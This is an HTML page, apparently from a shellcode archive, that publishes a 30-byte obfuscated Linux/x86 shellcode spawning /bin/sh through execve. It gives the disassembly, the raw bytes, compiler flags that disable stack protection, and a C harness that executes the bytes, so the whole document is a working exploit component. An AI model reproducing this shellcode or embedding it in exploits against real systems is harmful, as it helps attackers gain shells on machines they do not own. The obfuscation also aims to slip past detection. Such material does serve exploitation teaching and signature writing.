<html><head><title>Linux/x86 - Obfuscated execve /bin/sh (30 bytes)</title>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />
<meta http-equiv="Content-Language" content="en" />
</head>


<pre>
/*

Title   : Obfuscated execve /bin/sh (30 bytes)
Date    : 3rd July 2013
Author  : Russell Willis &lt;codinguy@gmail.com&gt;
System  : Linux/x86 (SMP Debian 3.2.41-2 i686)
  
To build:
gcc -fno-stack-protector -z execstack -o shellcode shellcode.c

00000000  31C9              xor ecx,ecx
00000002  F7E9              imul ecx
00000004  51                push ecx
00000005  040B              add al,0xb
00000007  EB08              jmp short 0x11
00000009  5E                pop esi
0000000A  87E6              xchg esp,esi
0000000C  99                cdq
0000000D  87DC              xchg ebx,esp
0000000F  CD80              int 0x80
00000011  E8F3FFFFFF        call dword 0x9
00000016  2F                das
00000017  62696E            bound ebp,[ecx+0x6e]
0000001A  2F                das
0000001B  2F                das
0000001C  7368              jnc 0x86

*/

#include &lt;stdio.h&gt;
 
unsigned char code[] = \
"\x31\xc9\xf7\xe9\x51\x04\x0b\xeb\x08\x5e\x87\xe6\x99\x87\xdc\xcd\x80"
"\xe8\xf3\xff\xff\xff\x2f\x62\x69\x6e\x2f\x2f\x73\x68";
 
main()
{
    printf("Shellcode Length: %d\n", sizeof(code)-1);
    int (*ret)() = (int(*)())code;
    ret();
}

<body><script type="text/javascript">
var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
document.write(unescape("%3Cscript src=%27" + gaJsHost + "google-analytics.com/ga.js%27 type=%27text/javascript%27%3E%3C/script%3E"));
</script>

<script type="text/javascript">
try {
var pageTracker = _gat._getTracker("UA-6809519-1");
pageTracker._trackPageview();
} catch(err) {}</script></body></html>
